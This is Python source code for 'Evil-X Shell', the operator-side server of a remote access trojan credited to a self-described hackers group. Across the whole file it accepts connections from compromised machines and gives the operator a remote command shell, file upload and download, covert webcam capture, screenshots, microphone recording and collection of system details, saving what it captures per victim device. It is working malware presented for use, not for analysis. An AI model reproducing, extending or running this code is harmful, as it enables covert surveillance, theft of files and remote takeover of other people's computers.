# python version >3.0
# This Python tool uses the following encoding: UTF-8
#
#
# ▀█████████▄     ▄████████
#   ███    ███   ███    ███         Tool Title: Evil-X Shell
#   ███    ███   ███    █▀          Author: Tesfahiwet Truneh
#   ███▄▄▄██▀    ███                Year of Dev't: 2023
#   ███▀▀▀██▄    ███                GitHub: https://github.com/BlackCobra29-bit
#   ███    ██▄   ███    █▄
#   ███    ███   ███    ███
# ▄█████████▀    ██████████
#
#                      Black Cobra Hackers Group..!
#                  "Our Dream Is Being Your Nightmare!!!!"

import socket
import os
import platform
import subprocess
import time
import pyautogui
from colorama import Fore, Style
from tqdm import tqdm
import cv2
import pyfiglet
from tabulate import tabulate
import threading
import random
import math
from queue import Queue
import sys
import getpass

MESSAGE_SAPARATOR = '<split>'
BUFFER_SIZE = pow(10, 10)
NUMBER_OF_THREAD_PROCESS = 2
JOB_NUMBER_LIST = [1, 2]
queue = Queue()
client_address_list = []
client_connection_list = []

WEBCAMERA_DIRECTORY = 'Webcam'
SCREENSHOT_DIRECTORY = 'Screenshot'
DOWNLOAD_DIRECTORY = 'Download'
AUDIO_RECORD_DIRECTORY = 'Audio Record'

app_password = getpass.getpass('Enter script password to continue: ')
if app_password != 'wahidgirmay':
    print('Incorrect Password.... existing system')
    time.sleep(1)
    sys.exit()

if platform.system() == 'Windows':
    os.system('cls')
if platform.system() == 'Linux':
    subprocess.run('clear')

def Print_Logo():
    Colors = ['\033[31m', '\033[32m', '\033[33m', '\033[34m', '\033[35m', '\033[36m', '\033[37m', '\033[39m']
    print('\t')
    Logo = r'''___________     .__.__            ____  ___ __________    ________________
\_   _____/__  _|__|  |           \   \/  / \______   \  /  _  \__    ___/
 |    __)_\  \/ /  |  |    ______  \     /   |       _/ /  /_\  \|    |   
 |        \\   /|  |  |__ /_____/  /     \   |    |   \/    |    \    |   
/_______  / \_/ |__|____/         /___/\  \  |____|_  /\____|__  /____|   
        \/                              \_/         \/         \/         '''

    for Line in Logo.split('\n'):
        time.sleep(0.2)
        print(Fore.YELLOW + Line)

Print_Logo()
print(f'{Fore.LIGHTGREEN_EX}')

print('\n\n\t\t[ Developed By: Tesfahiwet Truneh ]\n')
time.sleep(0.2)

host = '192.168.88.152'
port = 9999


print(Fore.BLUE + "\n[*]" + Style.RESET_ALL + " Server started 💀.")
print(Fore.BLUE + "[*]" + Style.RESET_ALL + " Server address https://" +
      host + ":" + str(port) + Style. RESET_ALL)

def Help():
    HELP_MENU = {
            'display       ': 'List of all connected clients to server socket',
            'attack <index>': 'Select a client to execute remote commands',
            'break         ': 'Break current client connection',
            'browse        ': 'Open browser and execute queries remotely',
            'background    ': 'Change client desktop backgroud image',
            'info          ': 'Display device hardware information',
            'webcam        ': 'Open webcam and take a photo',
            'screenshot    ': 'Take a screenshot of the main screen and save it as an image file',
            'upload        ': 'Upload the specified file from server to the client',
            'Download      ': 'Download the specified file from client to the server',
            'record        ': 'Turn on mic and record conversation for number of seconds'
        }
    
    for command, desc in HELP_MENU.items():
        print(" "*3 + str(command) + " "*3 + "-"*6 + " "*3 + str(desc))
        time.sleep(0.1)

def create_socket():
    global server_socket
    try:
        server_socket = socket.socket()
        server_socket.settimeout(None)
    except socket.error as Creation_Error:
        exec('print("error creating socket server" + str(Creation_Error))')
        time.sleep(2)
        create_socket()
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

def bind_socket():
    try:
        server_socket.bind((host, port))
        server_socket.listen(5)
    except socket.error as Binding_Error:
        exec('print("error binding address to socket" + str(Binding_Error))')
        bind_socket()

def accept_connection():
    for old_conn in client_connection_list:
        old_conn.close()
    global client_conn
    print('\n')
    while True:
        try:
            client_conn, client_addr = server_socket.accept()
            client_conn.setblocking(1)
            client_connection_list.append(client_conn)
            DEVICE_NAME = client_conn.recv(1024).decode('UTF-8')
            client_addr = client_addr + (DEVICE_NAME,)
            client_address_list.append(client_addr)
            print(Fore.LIGHTGREEN_EX + "\n[+] " + Style.RESET_ALL + "new device " + str(client_addr[0]) + " connection established with the server" + " at port " + str(client_addr[1]))
            time.sleep(0.2)
        except socket.error as Accept_Error:
            exec('print("error accepting connection" + str(Accept_Error))')
            continue

def before_active_connection():
    before_cmd = input(
        Fore.LIGHTBLUE_EX + "[*]" + Style.RESET_ALL + ' Shell command' + Fore.LIGHTGREEN_EX + '[Target Client Is Not Selected]' + Style.RESET_ALL + ' > ')
    if before_cmd == 'display':
        display_clients()
    elif before_cmd[:6] == 'attack':
        select_targeted_client(before_cmd)
    elif before_cmd == 'help':
        Help()
        before_active_connection()
    else:
        print(Fore.RED + '[!]' + Style.RESET_ALL + ' command not recognized')
        before_active_connection()

def display_clients():
    if client_address_list:
        print('Device Index' + " "*9 + 'Internal Ip' + " "*8 + 'Port' + " "*6 + 'Device Name')
        print('-'*12 + " "*9 + '-'*11 + " "*7 + '-'*5 + " "*6 + '-'*11)
        for index, address in enumerate(client_address_list):
            print(" "*3 + "Index " + str(index) + " "*11 + str(address[0]) + " "*5 + str(address[1]) + " "*6 + str(address[2]))
            time.sleep(0.2)
    else:
        print(Fore.LIGHTRED_EX + '[!]' + Style.RESET_ALL + ' No client is connected to the server')
    before_active_connection()

def select_targeted_client(before_cmd):
    client_index = int(before_cmd[7:])
    try:
        if client_address_list:
            active_client_conn = client_connection_list[client_index]
            print(Fore.LIGHTGREEN_EX + '[+]' + Style.RESET_ALL + 'Target client with address '
                + client_address_list[client_index][0] + ":" + str(client_address_list[client_index][1]) + ' selected')
            send_remote_command(client_index, active_client_conn)
        else:   
            print(Fore.LIGHTRED_EX + '[!]' + Style.RESET_ALL + ' No client is connected to the server')
            before_active_connection()
    except IndexError:
        print(Fore.LIGHTRED_EX + '[!]' + Style.RESET_ALL + ' client index error')
        before_active_connection()

def send_remote_command(client_index, active_client_conn):
    try: 
        client_working_dir = active_client_conn.recv(1024).decode('UTF-8')
        time.sleep(0.1)
        print(Fore.LIGHTGREEN_EX + '[+]' + Style.RESET_ALL + 'Client current working directory received....')
    except Exception as e:
        print(Fore.RED + '[!]' + Style.RESET_ALL + ' Something went wrong getting client CWD: ' + str(e))
    try:
        if not os.path.exists('static/device/' + client_address_list[client_index][2]):
            os.mkdir('static/device/' + client_address_list[client_index][2])
            os.mkdir('static/device/' + str(client_address_list[client_index][2]) + "/" + WEBCAMERA_DIRECTORY)
            os.mkdir('static/device/' + str(client_address_list[client_index][2]) + "/" + SCREENSHOT_DIRECTORY)
            os.mkdir('static/device/' + str(client_address_list[client_index][2]) + "/" + DOWNLOAD_DIRECTORY)
            os.mkdir('static/device/' + str(client_address_list[client_index][2]) + "/" + AUDIO_RECORD_DIRECTORY)
            print(Fore.LIGHTGREEN_EX + "\n[+] " + Style.RESET_ALL + "Remote Device Resource Management Directory Created...")
    except Exception as e:
        print(Fore.RED + '[!]' + Style.RESET_ALL + ' Can\'t create device name directory: ' + str(e))
        sys.exit('Existing Server....')
    while True:
        userInput = input(
            Fore.LIGHTBLUE_EX + "[*] " + Style.RESET_ALL + str(client_working_dir) + ' > ')
        if userInput[
           :2] != 'cd' and userInput != 'upload' and userInput != 'download' and userInput != 'screenshot' and userInput != 'webcam' and userInput != 'record' and userInput != 'browse' and userInput != 'info' and userInput != 'background' and userInput != 'quit' and userInput != 'help':
            try:
                active_client_conn.send(userInput.encode("UTF-8"))
                client_response = active_client_conn.recv(1000000).decode('UTF-8')
                print(client_response)
            except Exception as e:
                print(Fore.RED + " "*3 + "Something Went Wrong on the server code " + str(e) + Style.RESET_ALL)
        
        elif userInput[:] == 'help':
            Help()

        elif userInput[:] == 'quit':
            try:
                active_client_conn.send(userInput.encode("UTF-8"))
            except Exception as e:
                print(Fore.RED + " "*3 + "Something Went Wrong on the server code " + str(e) + Style.RESET_ALL)
            break

        elif userInput[:2] == 'cd':
            try:
                active_client_conn.send(userInput.encode("UTF-8"))
                client_response = active_client_conn.recv(BUFFER_SIZE).decode('UTF-8')
                client_working_dir = client_response
            except Exception as e:
                print(Fore.RED + " "*3 + "Something Went Wrong on the server code " + str(e) + Style.RESET_ALL)

        elif userInput[:] == 'browse':
            try:
                active_client_conn.send(userInput.encode("UTF-8"))
                search_query = input(Fore.LIGHTBLUE_EX + "Enter Query: " + Style.RESET_ALL)
                active_client_conn.send(search_query.encode("UTF-8"))
                command_response = active_client_conn.recv(BUFFER_SIZE).decode('UTF-8')
                print(Fore.LIGHTRED_EX + "Client Response: " + Fore.LIGHTGREEN_EX +  str(command_response) + Style.RESET_ALL)
            except Exception as e:
                print(Fore.RED + " "*3 + 'Something Went Wrong on the server code ' + str(e) + Style.RESET_ALL)

        elif userInput == "background":
            try:
                active_client_conn.send(userInput.encode("UTF-8"))
                image_file = input(Fore.LIGHTBLUE_EX + "Enter Image Full Path: " + Style.RESET_ALL)
                active_client_conn.send(image_file.encode('UTF-8'))
                command_response = active_client_conn.recv(BUFFER_SIZE).decode('UTF-8')
                print(Fore.LIGHTRED_EX + "Client Response: " + Fore.LIGHTGREEN_EX +  str(command_response) + Style.RESET_ALL)
            except Exception as e:
                print(Fore.RED + " "*3 + 'Something Went Wrong on the server code ' + str(e) + Style.RESET_ALL)

        elif userInput == 'info':
            try:
                active_client_conn.send(userInput.encode("UTF-8"))
                system_info = active_client_conn.recv(BUFFER_SIZE).decode('utf-8')
                SYSTEM_INFO_ITEM = []
                for system_item in system_info.split(MESSAGE_SAPARATOR):
                    SYSTEM_INFO_ITEM.append(system_item)
                SYSTEM_INFO_DICT = {
                    '✓ Client Device Name': SYSTEM_INFO_ITEM[0],
                    '✓ Client Device Name': SYSTEM_INFO_ITEM[1],
                    '✓ Device Release Info': SYSTEM_INFO_ITEM[2],
                    '✓ Device Version Info': SYSTEM_INFO_ITEM[3],
                    '✓ Client\'s Device Machine': SYSTEM_INFO_ITEM[4],
                    '✓ Client Device Processor': SYSTEM_INFO_ITEM[5],
                    '✓ Total Disk Space': SYSTEM_INFO_ITEM[6],
                    '✓ Free Disk Space': SYSTEM_INFO_ITEM[7],
                    '✓ Used Disk Space': SYSTEM_INFO_ITEM[8]
                }
                for KEY, VALUE in SYSTEM_INFO_DICT.items():
                    print(Fore.YELLOW + " "*3 + KEY + " ===> " + VALUE + Style.RESET_ALL)
                    time.sleep(0.2)
            except Exception as e:
                print(Fore.RED + " "*3 + 'Something Went Wrong on the server code ' + str(e) + Style.RESET_ALL)

        elif userInput == 'webcam':
            try:
                active_client_conn.send(userInput.encode("UTF-8"))
                CAMERA_EXISTENCE = active_client_conn.recv(1024).decode('UTF-8')
                if CAMERA_EXISTENCE != str(False):
                    image_name = "Remote_Camera_" + active_client_conn.recv(1024).decode("UTF-8")
                    image_chunk = active_client_conn.recv(BUFFER_SIZE)
                    with open("static/Device/" + str(client_address_list[client_index][2]) + "/" + WEBCAMERA_DIRECTORY + "/" + str(image_name), "wb") as file_obj:
                        file_obj.write(image_chunk)
                    print(Fore.LIGHTRED_EX + "Client Response: " + Fore.LIGHTGREEN_EX + str(image_name) + ' Saved Successfully' + Style.RESET_ALL)
                    img = cv2.imread("static/Device/" + str(client_address_list[client_index][2]) + "/" + WEBCAMERA_DIRECTORY + "/" + str(image_name))
                    cv2.imshow("Remotely Captured Photo", img)
                    cv2.waitKey(0)
                    print(Fore.LIGHTRED_EX + "Server Response: " + Fore.LIGHTGREEN_EX + 'image file' + 
                        ' saved to ' + Fore.YELLOW + 'static/Device/' + str(client_address_list[client_index][2])
                        + '/' + str(WEBCAMERA_DIRECTORY) + Style.RESET_ALL)
                else:
                    print(Fore.RED + " "*3 + 'Webcamera is not found on the target client' + str(e) + Style.RESET_ALL)
            except Exception as e:
                print(Fore.RED + " "*3 + 'Something Went Wrong on the server code ' + str(e) + Style.RESET_ALL)

        elif userInput == "screenshot":
            try:
                active_client_conn.send(userInput.encode("UTF-8"))
                screenshot_name = "Remote_Screenshot_" + str(random.randrange(1, 1000000)) + ".jpg"
                image_chunk = active_client_conn.recv(BUFFER_SIZE)
                with open("static/Device/" + str(client_address_list[client_index][2]) + "/" + SCREENSHOT_DIRECTORY + "/" + str(screenshot_name), "wb") as screenshot_obj:
                    screenshot_obj.write(image_chunk)
                screenshot_obj.close()
                print(Fore.LIGHTRED_EX + "Client Response: " + Fore.LIGHTGREEN_EX +  "Remote Screenshot Taken Successfully" + Style.RESET_ALL)
                screenshot = cv2.imread("static/Device/" + str(client_address_list[client_index][2]) + "/" + SCREENSHOT_DIRECTORY + "/" + str(screenshot_name))
                cv2.imshow("Remotely Taken Screenshot", screenshot)
                cv2.waitKey(0)
                print(Fore.LIGHTRED_EX + "Server Response: " + Fore.LIGHTGREEN_EX + 'image file' + 
                  ' saved to ' + Fore.YELLOW + 'static/Device/' + str(client_address_list[client_index][2])
                    + '/' + str(SCREENSHOT_DIRECTORY) + Style.RESET_ALL)
            except Exception as e:
                print(Fore.RED + " "*3 + 'Something Went Wrong on the server code ' + str(e) + Style.RESET_ALL)

        elif userInput == "upload":
            active_client_conn.send(userInput.encode("UTF-8"))    
            try:
                filename = input(Fore.LIGHTBLUE_EX + " "*3 + "Enter file name: " + Style.RESET_ALL)
                if os.path.isfile(filename):
                    active_client_conn.send(str.encode(filename))
                    filesize = os.path.getsize(filename)
                    file_size = str(round(filesize/pow(10, 3))) + " KB"
                    with open(filename, "rb") as file_upload_obj:
                        file_data = file_upload_obj.read(BUFFER_SIZE)
                        active_client_conn.send(file_data)
                    file_upload_obj.close()
                    print(Fore.LIGHTRED_EX + "Client Response: " + Fore.LIGHTGREEN_EX + file_size + " File Successfully Uploaded to Remote Machine" + Style.RESET_ALL)
                else:
                    print(Fore.RED + " "*3 + 'File not Found On The Server ' + Style.RESET_ALL)
            except Exception as e:
                print(Fore.RED + " "*3 + 'Something Went Wrong on the server code ' + str(e) + Style.RESET_ALL)


        elif userInput == "download":
            active_client_conn.send(userInput.encode("UTF-8"))
            try:
                filename = input(Fore.LIGHTBLUE_EX + "Enter file name: " + Style.RESET_ALL)
                active_client_conn.send(str.encode(filename))
                check_file_exist = active_client_conn.recv(1024).decode('UTF-8')
                if check_file_exist != str(False):
                    file_size = active_client_conn.recv(1024).decode('UTF-8')
                    file_byte = active_client_conn.recv(BUFFER_SIZE)
                    with open("static/Device/" + str(client_address_list[client_index][2] + "/" + DOWNLOAD_DIRECTORY + "/" + str(filename)), "wb") as file_obj:
                        file_obj.write(file_byte)
                    file_obj.close()
                    print(Fore.LIGHTRED_EX + "Client Response: " + Fore.LIGHTGREEN_EX + "Successfull Download of " + str(file_size) + " KB Size File" + Style.RESET_ALL)
                    print(Fore.LIGHTRED_EX + "Server Response: " + Fore.LIGHTGREEN_EX + 'file' + 
                  ' saved to ' + Fore.YELLOW + 'static/Device/' + str(client_address_list[client_index][2])
                    + '/' + str(DOWNLOAD_DIRECTORY) + Style.RESET_ALL)
                else:
                    print(Fore.RED + " "*3 + "File Doesn't Exist On the Directory" + Style.RESET_ALL)
            except Exception as e:
                    print(Fore.RED + " "*3 + 'Something Went Wrong on the server code ' + str(e) + Style.RESET_ALL)

        elif userInput == "record":
            try:
                active_client_conn.send(userInput.encode("UTF-8"))
                DURACTION = input(Fore.LIGHTBLUE_EX + "Enter Recording Duration(seconds): " + Style.RESET_ALL)
                active_client_conn.send(DURACTION.encode('UTF-8'))
                FILE_RECORD = active_client_conn.recv(1024).decode('UTF-8')
                AUDIO_BYTES = active_client_conn.recv(BUFFER_SIZE)
                with open("static/Device/" + str(client_address_list[client_index][2]) + "/" + str(AUDIO_RECORD_DIRECTORY) + "/" + str(FILE_RECORD), 'wb') as AUDIO_FILE:
                    AUDIO_FILE.write(AUDIO_BYTES)
                AUDIO_FILE.close()
                print(Fore.LIGHTRED_EX + "Client Response: " + Fore.LIGHTGREEN_EX +  "Successfull Remote Audio Recording..." + Style.RESET_ALL)
                print(Fore.LIGHTRED_EX + "Server Response: " + Fore.LIGHTGREEN_EX + 'audio file' + 
                    ' saved to ' + Fore.YELLOW + 'static/Device/' + str(client_address_list[client_index][2])
                    + '/' + str(AUDIO_RECORD_DIRECTORY) + Style.RESET_ALL)
            except Exception as e:
                print(Fore.RED + " "*3 + 'Something Went Wrong on the server code ' + str(e) + Style.RESET_ALL)

        else:
            print(Fore.LIGHTRED_EX + " "*3 + 'Unrecognized Tool Command' + Style.RESET_ALL)
            pass

    del client_address_list[client_index]
    del client_connection_list[client_index]
    print('Quiting Client Connection')
    time.sleep(1)
    before_active_connection()

def create_workers():
    for _ in range(NUMBER_OF_THREAD_PROCESS):
        t = threading.Thread(target=work)
        t.daemon = False
        t.start()

def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accept_connection()
        if x == 2:
            before_active_connection()
        queue.task_done()

def create_jobs():
    for x in JOB_NUMBER_LIST:
        queue.put(x)
    queue.join()

def main():
    create_workers()
    create_jobs()

if __name__ == '__main__':
    main()
